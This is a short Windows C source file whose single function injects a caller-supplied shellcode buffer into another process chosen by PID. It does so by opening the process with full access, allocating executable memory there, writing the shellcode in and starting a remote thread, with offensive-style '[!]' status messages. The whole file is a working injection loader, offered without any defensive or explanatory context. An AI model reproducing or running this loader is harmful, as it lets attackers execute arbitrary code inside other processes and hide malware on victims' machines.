#define _WIN32_WINNT 0x0600

#include <windows.h>
#include <stdio.h>

int load(unsigned char* shellcode, size_t size, DWORD pid) {
    HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hproc == NULL) {
        printf("[!] Failed To Open Process\n");
        return 0;
    }

    LPVOID buffer = VirtualAllocEx(hproc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!buffer) {
        printf("[!] Failed To Allocate Memory In Target Process\n");
        CloseHandle(hproc);
        return 0;
    }

    if (!WriteProcessMemory(hproc, buffer, shellcode, size, NULL)) {
        printf("[!] Failed To Write Shellcode To Process\n");
        VirtualFreeEx(hproc, buffer, 0, MEM_RELEASE);
        CloseHandle(hproc);
        return 0;
    }

    HANDLE thread = CreateRemoteThread(hproc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
    if (!thread) {
        printf("[!] Failed To Create Remote Thread\n");
        VirtualFreeEx(hproc, buffer, 0, MEM_RELEASE);
        CloseHandle(hproc);
        return 0;
    }

    CloseHandle(thread);
    CloseHandle(hproc);
    return 1;
}
